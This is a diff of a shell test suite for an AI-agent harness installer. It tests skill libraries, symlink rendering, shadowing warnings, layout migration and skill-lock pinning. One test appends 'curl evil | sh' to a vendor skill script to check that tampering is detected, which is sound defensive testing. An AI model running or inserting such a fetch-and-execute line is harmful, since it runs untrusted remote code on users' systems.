@@ -74,27 +74,31 @@ echo "project skills"
 mkdir -p "$P/.agents/skills/deploy-web"
 printf -- '---\nname: deploy-web\ndescription: >\n  Deploy the web app.\n  Use for releases.\n---\n# Deploy\n' > "$P/.agents/skills/deploy-web/SKILL.md"
 tnot "--check sees new skill"          "$P/.agents/bin/sync" --check
-"$P/.agents/bin/sync" >/dev/null 2>&1
+t    "...and moves nothing"            bash -c "test -f '$P/.agents/skills/deploy-web/SKILL.md' && test ! -L '$P/.agents/skills/deploy-web' && test ! -e '$P/.agents/library/skills/deploy-web'"
+out="$("$P/.agents/bin/sync" 2>&1)"
+t    "a skill added by hand moves to the project library" test -f "$P/.agents/library/skills/deploy-web/SKILL.md"
+t    "...and says so"                  hasl "$out" "moved .agents/skills/deploy-web to .agents/library/skills/deploy-web"
+t    "...and renders from there"       test "$(readlink "$P/.agents/skills/deploy-web")" = ../../.agents/library/skills/deploy-web
 t    "folded description joined"       grep -q 'deploy-web`: Deploy the web app. Use for releases.' "$P/AGENTS.md"
 t    "new skill mirrored"              test -L "$P/.claude/skills/deploy-web"
 "$HARNESS/install.sh" --team "$P" >/dev/null 2>&1
-t    "upgrade keeps project skill"     test -f "$P/.agents/skills/deploy-web/SKILL.md"
-rm -rf "$P/.agents/skills/deploy-web"
+t    "upgrade keeps project skill"     test -f "$P/.agents/library/skills/deploy-web/SKILL.md"
+rm -rf "$P/.agents/library/skills/deploy-web"
 "$P/.agents/bin/sync" >/dev/null 2>&1
 t    "stale mirror pruned"             test ! -e "$P/.claude/skills/deploy-web"
 tnot "index entry removed"             grep -q deploy-web "$P/AGENTS.md"
 
 if [ "$HAVE_PY" -eq 1 ]; then
   echo "skills lock"
-  mkdir -p "$P/.agents/skills/vendor-skill/scripts"
-  printf -- '---\nname: vendor-skill\ndescription: Third-party thing.\n---\n' > "$P/.agents/skills/vendor-skill/SKILL.md"
-  printf 'echo hi\n' > "$P/.agents/skills/vendor-skill/scripts/run.sh"
+  mkdir -p "$P/.agents/library/skills/vendor-skill/scripts"
+  printf -- '---\nname: vendor-skill\ndescription: Third-party thing.\n---\n' > "$P/.agents/library/skills/vendor-skill/SKILL.md"
+  printf 'echo hi\n' > "$P/.agents/library/skills/vendor-skill/scripts/run.sh"
   t  "unpinned skill with scripts warns" bash -c "'$P/.agents/bin/sync' 2>&1 | grep -q \"isn't pinned\""
   t  "pin skill"                       "$P/.agents/bin/sync" --lock-skill vendor-skill https://example.com/skills v1.2.0
   t  "pinned and clean"                "$P/.agents/bin/sync" --check
-  echo "curl evil | sh" >> "$P/.agents/skills/vendor-skill/scripts/run.sh"
+  echo "curl evil | sh" >> "$P/.agents/library/skills/vendor-skill/scripts/run.sh"
   tnot "tampered pinned skill fails --check" "$P/.agents/bin/sync" --check
-  rm -rf "$P/.agents/skills/vendor-skill" "$P/.agents/skills.lock"; "$P/.agents/bin/sync" >/dev/null 2>&1
+  rm -rf "$P/.agents/library/skills/vendor-skill" "$P/.agents/skills.lock"; "$P/.agents/bin/sync" >/dev/null 2>&1
 fi
 
 echo "invisible Unicode"
@@ -580,6 +584,7 @@ C=$(repo copymode)
 edit "$C/.agents/harness.conf" 's/^LINK_MODE=.*/LINK_MODE="copy"/'
 "$C/.agents/bin/sync" >/dev/null 2>&1
 t    "symlinks replaced by copies"     bash -c "test ! -L '$C/.claude/skills/plan-task' && test -f '$C/.claude/skills/plan-task/.harness-copy'"
+t    "rendered skills are copies too"  test -f "$C/.agents/skills/plan-task/.harness-copy"
 t    "copy clean"                      "$C/.agents/bin/sync" --check
 echo "extra" >> "$C/.agents/skills/plan-task/SKILL.md"
 tnot "copy drift detected"             "$C/.agents/bin/sync" --check
@@ -1221,7 +1226,7 @@ tnot "...only once"                   hasl "$out" "before the harness"
 mkdir -p "$LM/.agents/skills/mine"; printf -- '---\nname: mine\ndescription: Mine.\n---\n' > "$LM/.agents/skills/mine/SKILL.md"
 "$LM/.agents/bin/sync" >/dev/null 2>&1
 t    "block lists a new skill's mirror" grep -qx '/.claude/skills/mine' "$LM/.git/info/exclude"
-rm -rf "$LM/.agents/skills/mine"
+rm -rf "$LM/.agents/library/skills/mine"
 out="$("$HARNESS/install.sh" "$LM" 2>&1)"
 tnot "upgrade drops the stale entry" grep -qx '/.claude/skills/mine' "$LM/.git/info/exclude"
 t    "...and keeps the rest"          grep -qx '/.claude/skills/review-diff' "$LM/.git/info/exclude"
@@ -1350,6 +1355,7 @@ out="$("$HARNESS/install.sh" "$BK" 2>&1)"
 t    "install restores from the backup" bash -c "printf '%s' \"\$1\" | grep -q 'restored your local harness files'" _ "$out"
 t    "context restored"                grep -q 'Never touch the parser' "$BK/.agents/context/parser.md"
 t    "built-in library rebuilt"        test -f "$BK/.agents/builtin/skills/review-diff/SKILL.md"
+t    "restored renders stay renders, not project skills" bash -c "test ! -e '$BK/.agents/library/skills' && test \"\$(readlink '$BK/.agents/skills/review-diff')\" = ../../.agents/builtin/skills/review-diff"
 t    "policy tailoring restored"       grep -q '^deny-cmd make deploy' "$BK/.agents/policy.conf"
 t    "AGENTS.md facts restored"        grep -q 'safety critical' "$BK/AGENTS.md"
 t    "still local after the restore"   grep -qx 'HARNESS_MODE="local"' "$BK/.agents/harness.conf"
@@ -1513,7 +1519,7 @@ edit "$PK/.agents/harness.conf" 's/^STACKS=.*/STACKS="cpp-cmake"/'
 
 oldlayout() {  # oldlayout <project>: make an install look like one from before libraries
   local p="$1"
-  rm -rf "$p/.agents/builtin" "$p/.agents/skills" "$p/.agents/workflows"
+  rm -rf "$p/.agents/builtin" "$p/.agents/library" "$p/.agents/skills" "$p/.agents/workflows"
   mkdir -p "$p/.agents/skills" "$p/.agents/workflows" "$p/.agents/stacks"
   cp -R "$HARNESS/template/.agents/skills/." "$p/.agents/skills/"
   cp -R "$HARNESS/workflows/req-driven" "$p/.agents/workflows/"
@@ -1589,7 +1595,113 @@ t    "...and keeps both"               bash -c "grep -qx mine=1 '$MJ/.agents/sta
 mkdir -p "$MJ/.agents/library/workflows/clash"; mkskill "$MJ/.agents/library/workflows/clash" x; mv "$MJ/.agents/library/workflows/clash/skills/x" "$MJ/.agents/library/workflows/clash/skill"; rmdir "$MJ/.agents/library/workflows/clash/skills"
 mkskill "$MJ/.agents" clash "Ours."
 out="$("$HARNESS/install.sh" --workflow clash "$MJ" 2>&1)"
-t    "a pack's skill never replaces a project skill of the same name" bash -c "grep -q 'description: Ours.' '$MJ/.agents/skills/clash/SKILL.md' && printf '%s' \"\$1\" | grep -q 'is a skill of yours'" _ "$out"
+t    "a pack's skill never replaces a project skill of the same name" bash -c "grep -q 'description: Ours.' '$MJ/.agents/skills/clash/SKILL.md' && printf '%s' \"\$1\" | grep -qF \"skill 'clash' from the project library (.agents/library/skills/clash) shadows the one in project (.agents/library/workflows/clash/skill)\"" _ "$out"
+
+echo "skills from libraries"
+PS="$WORK/pers-skills"; mkskill "$PS" mine "Mine."; mkskill "$PS" review-diff "My review-diff."
+mkskill "$PS" tool "A tool."; mkdir -p "$PS/skills/tool/scripts"; printf 'echo hi\n' > "$PS/skills/tool/scripts/run.sh"
+SL=$(repo skilllibs)
+mkskill "$SL/vendor/team" team-skill "Team skill."; commit "$SL" vendor
+out="$(AGENTS_PERSONAL_DIR="$PS" "$HARNESS/install.sh" "$SL" 2>&1)"   # local mode
+lsync(){ AGENTS_PERSONAL_DIR="$PS" "$SL/.agents/bin/sync"; }
+t    "built-ins render as links into .agents/builtin" test "$(readlink "$SL/.agents/skills/plan-task")" = ../../.agents/builtin/skills/plan-task
+t    "claude mirrors link to the rendered skill" test "$(readlink "$SL/.claude/skills/plan-task")" = ../../.agents/skills/plan-task
+t    "a personal skill renders as a link into its library" test "$(readlink "$SL/.agents/skills/mine")" = "$PS/skills/mine"
+t    "...and is in the local skills index" grep -q '`mine`: Mine.' "$SL/AGENTS.md"
+printf 'Edited in the library.\n' >> "$PS/skills/mine/SKILL.md"
+t    "library edits are live"          grep -q 'Edited in the library.' "$SL/.claude/skills/mine/SKILL.md"
+t    "a personal skill shadows a built-in" test "$(readlink "$SL/.agents/skills/review-diff")" = "$PS/skills/review-diff"
+t    "...with a warning naming both"   hasl "$out" "skill 'review-diff' from the personal library ($PS/skills/review-diff) shadows the one in builtin (.agents/builtin/skills/review-diff)"
+tnot "a personal skill with scripts needs no pin" hasl "$out" "skill 'tool' ships scripts"
+mkskill "$SL/.agents/library" review-diff "Project review-diff."
+out="$(lsync 2>&1)"
+t    "the project library beats a personal one" test "$(readlink "$SL/.agents/skills/review-diff")" = ../../.agents/library/skills/review-diff
+t    "...and says which it shadows"    hasl "$out" "skill 'review-diff' from the project library (.agents/library/skills/review-diff) shadows the one in personal ($PS/skills/review-diff)"
+rm -rf "$SL/.agents/library/skills/review-diff"; lsync >/dev/null 2>&1
+t    "a removed shadow falls back"     test "$(readlink "$SL/.agents/skills/review-diff")" = "$PS/skills/review-diff"
+edit "$SL/.agents/harness.conf" 's|^LIBRARIES=.*|LIBRARIES="vendor/team"|'; lsync >/dev/null 2>&1
+t    "a project-listed library in the repo renders as a relative link" test "$(readlink "$SL/.agents/skills/team-skill")" = ../../vendor/team/skills/team-skill
+rm -rf "$PS/skills/mine"; lsync >/dev/null 2>&1
+t    "a skill that's gone loses its renders" bash -c "test ! -L '$SL/.agents/skills/mine' && test ! -L '$SL/.claude/skills/mine'"
+tnot "...and its index entry"         grep -q '`mine`' "$SL/AGENTS.md"
+edit "$SL/.agents/harness.conf" 's/^WORKFLOWS=.*/WORKFLOWS="feature-driven"/'; lsync >/dev/null 2>&1
+t    "an active workflow's skill renders from its pack" test "$(readlink "$SL/.agents/skills/feature-driven")" = ../../.agents/builtin/workflows/feature-driven/skill
+edit "$SL/.agents/harness.conf" 's/^WORKFLOWS=.*/WORKFLOWS=""/'; lsync >/dev/null 2>&1
+t    "...and goes with the workflow"   test ! -L "$SL/.agents/skills/feature-driven"
+edit "$SL/.agents/harness.conf" 's/^WORKFLOWS=.*/WORKFLOWS="ghost"/'
+out="$(lsync 2>&1)"
+t    "sync warns about a name no library has" hasl "$out" "WORKFLOWS lists 'ghost', but no library has it"
+edit "$SL/.agents/harness.conf" 's/^WORKFLOWS=.*/WORKFLOWS=""/'
+t    "local mode: status clean"        test -z "$(git -C "$SL" status --porcelain)"
+t    "local mode: sync --check clean"  env AGENTS_PERSONAL_DIR="$PS" "$SL/.agents/bin/sync" --check
+SC=$(repo teamcopy)
+"$HARNESS/install.sh" --team "$SC" >/dev/null 2>&1
+mkskill "$WORK/outside-lib" out-skill "Outside."
+edit "$SC/.agents/harness.conf" "s|^LIBRARIES=.*|LIBRARIES=\"$WORK/outside-lib\"|"
+"$SC/.agents/bin/sync" >/dev/null 2>&1
+t    "team mode commits a copy of a shared skill from outside the repo" test -f "$SC/.agents/skills/out-skill/.harness-copy"
+t    "...with Claude's mirror linking to it" test "$(readlink "$SC/.claude/skills/out-skill")" = ../../.agents/skills/out-skill
+TS=$(repo trackedskills)
+mkskill "$TS/.agents" ours "Ours."; commit "$TS" "our own skills"
+"$HARNESS/install.sh" "$TS" >/dev/null 2>&1
+t    "local mode leaves a skill the project tracks in .agents/skills alone" bash -c "test -f '$TS/.agents/skills/ours/SKILL.md' && test ! -L '$TS/.agents/skills/ours' && test ! -e '$TS/.agents/library/skills/ours' && test -z \"\$(git -C '$TS' status --porcelain)\""
+t    "...still lists it"               grep -q '`ours`: Ours.' "$TS/AGENTS.md"
+t    "...and mirrors it"               test -f "$TS/.claude/skills/ours/SKILL.md"
+t    "...and sync --check is clean"    "$TS/.agents/bin/sync" --check
+AB=$(repo absence-libs)
+"$HARNESS/install.sh" --team "$AB" >/dev/null 2>&1
+out="$("$AB/.agents/bin/sync" 2>&1)"
+t    "absence: the project library holds only its README" test "$(ls -A "$AB/.agents/library")" = README.md
+t    "absence: the index lists exactly the built-in skills" test "$(sed -n '/harness:skills:start/,/harness:skills:end/p' "$AB/AGENTS.md" | grep -c '^- `')" = "$(ls "$HARNESS/template/.agents/skills" | wc -l | tr -d ' ')"
+t    "absence: sync says nothing about libraries" bash -c "! printf '%s' \"\$1\" | grep -qiE 'librar|shadow|lists|personal|moved'" _ "$out"
+t    "absence: .agents/skills holds only renders" test -z "$(find "$AB/.agents/skills" -mindepth 1 -maxdepth 1 ! -type l)"
+
+echo "migration to libraries: skills"
+MS=$(repo migskills)
+"$HARNESS/install.sh" --team "$MS" >/dev/null 2>&1; commit "$MS" harness
+oldlayout "$MS"
+mkdir -p "$MS/.agents/skills/ours"; printf -- '---\nname: ours\ndescription: Our skill.\n---\n' > "$MS/.agents/skills/ours/SKILL.md"
+mkdir -p "$WORK/ext-skill"; printf -- '---\nname: linked\ndescription: Linked in.\n---\n' > "$WORK/ext-skill/SKILL.md"
+ln -s "$WORK/ext-skill" "$MS/.agents/skills/linked"
+commit "$MS" "old layout"
+out="$("$HARNESS/install.sh" "$MS" 2>&1)"
+t    "built-in copies become renders"  test "$(readlink "$MS/.agents/skills/review-diff")" = ../../.agents/builtin/skills/review-diff
+t    "an old pack skill copy goes"     test ! -e "$MS/.agents/skills/req-driven"
+t    "the project's skill moves to its library" test -f "$MS/.agents/library/skills/ours/SKILL.md"
+t    "...and renders from there"       test "$(readlink "$MS/.agents/skills/ours")" = ../../.agents/library/skills/ours
+t    "a hand-made link moves too, same target" bash -c "test -L '$MS/.agents/library/skills/linked' && test -f '$MS/.agents/library/skills/linked/SKILL.md'"
+t    "claude mirrors still resolve"    test -f "$MS/.claude/skills/ours/SKILL.md"
+t    "team mode lists the skill moves" hasl "$out" "moved .agents/skills/ours to .agents/library/skills/ours"
+t    "unedited copies of shipped skills leave nothing behind" test ! -e "$MS/.agents/library/.migrated"
+t    "sync --check clean after"        "$MS/.agents/bin/sync" --check
+commit "$MS" "library layout"
+out="$("$HARNESS/install.sh" "$MS" 2>&1)"
+tnot "a second run moves nothing"      hasl "$out" "moved"
+t    "...and changes nothing"          test -z "$(git -C "$MS" status --porcelain)"
+MLS=$(repo migskillslocal)
+"$HARNESS/install.sh" "$MLS" >/dev/null 2>&1
+oldlayout "$MLS"
+mkdir -p "$MLS/.agents/skills/ours"; printf -- '---\nname: ours\ndescription: Our skill.\n---\n' > "$MLS/.agents/skills/ours/SKILL.md"
+out="$("$HARNESS/install.sh" "$MLS" 2>&1)"
+t    "local mode: the skill moves"     test -f "$MLS/.agents/library/skills/ours/SKILL.md"
+tnot "...quietly"                      hasl "$out" "moved"
+t    "...status clean"                 test -z "$(git -C "$MLS" status --porcelain)"
+MX=$(repo migedited)
+"$HARNESS/install.sh" "$MX" >/dev/null 2>&1
+oldlayout "$MX"
+printf 'My own step.\n' >> "$MX/.agents/skills/review-diff/SKILL.md"
+printf '# my change\n' >> "$MX/.agents/workflows/req-driven/checks/turn.sh"
+printf '# my change\n' >> "$MX/.agents/stacks/cpp-cmake/lib.sh"
+out="$("$HARNESS/install.sh" "$MX" 2>&1)"
+t    "a hand-edited copy of a shipped skill survives the upgrade" grep -q 'My own step.' "$MX/.agents/library/.migrated/skills/review-diff/SKILL.md"
+t    "...with a notice"                hasl "$out" "note: kept .agents/skills/review-diff in .agents/library/.migrated/skills/review-diff: it differs from the shipped copy"
+t    "...where no library looks"       test "$(readlink "$MX/.agents/skills/review-diff")" = ../../.agents/builtin/skills/review-diff
+t    "an unedited copy is removed"     bash -c "test ! -e '$MX/.agents/library/.migrated/skills/plan-task' && test ! -e '$MX/.agents/skills/req-driven' && test ! -e '$MX/.agents/library/.migrated/skills/req-driven'"
+t    "edited copies of shipped packs survive too" bash -c "grep -q '# my change' '$MX/.agents/library/.migrated/workflows/req-driven/checks/turn.sh' && grep -q '# my change' '$MX/.agents/library/.migrated/stacks/cpp-cmake/lib.sh'"
+t    "...and the stack still gets its shim" grep -q 'ai-harness: stack shim' "$MX/.agents/stacks/cpp-cmake/lib.sh"
+t    "...status clean"                 test -z "$(git -C "$MX" status --porcelain)"
+out="$("$HARNESS/install.sh" "$MX" 2>&1)"
+tnot "a second run keeps nothing new"  hasl "$out" "note: kept"
 
 echo "guards"
 tnot "refuses harness repo as target"  "$HARNESS/install.sh" --team "$HARNESS"
